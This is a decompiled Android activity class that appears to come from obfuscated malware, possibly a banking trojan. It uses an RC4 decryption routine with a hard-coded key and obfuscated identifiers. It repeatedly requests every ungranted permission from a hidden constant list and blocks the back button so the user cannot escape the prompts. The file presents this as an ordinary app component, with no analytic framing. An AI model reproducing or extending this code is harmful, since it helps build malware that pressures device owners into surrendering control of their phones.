package com.example.mmm.Activity;

import android.app.Activity;
import android.os.Bundle;
import android.os.Build.VERSION;
import android.util.Base64;
import android.view.KeyEvent;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;

public class actPermissions extends Activity {
   constants consts = new constants();
   utils utl = new utils();

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      this.utl.SettingsWrite(this, "SQ", "1");
      if (VERSION.SDK_INT >= 23) {
         String[] var5 = this.consts.pentium$;
         int var3 = var5.length;

         for(int var2 = 0; var2 < var3; ++var2) {
            String var4 = var5[var2];
            if (this.checkCallingOrSelfPermission(var4) != 0) {
               this.utl.SettingsWrite(this, "SQ", "1");
               this.requestPermissions(new String[]{var4}, 123);
            }
         }
      }

      this.finish();
   }

   protected void onDestroy() {
      super.onDestroy();
   }

   public boolean onKeyDown(int var1, KeyEvent var2) {
      return var1 == 4 || super.onKeyDown(var1, var2);
   }

   protected void onPause() {
      super.onPause();
   }

   protected void onResume() {
      super.onResume();
   }

   protected void onStop() {
      super.onStop();
   }
}
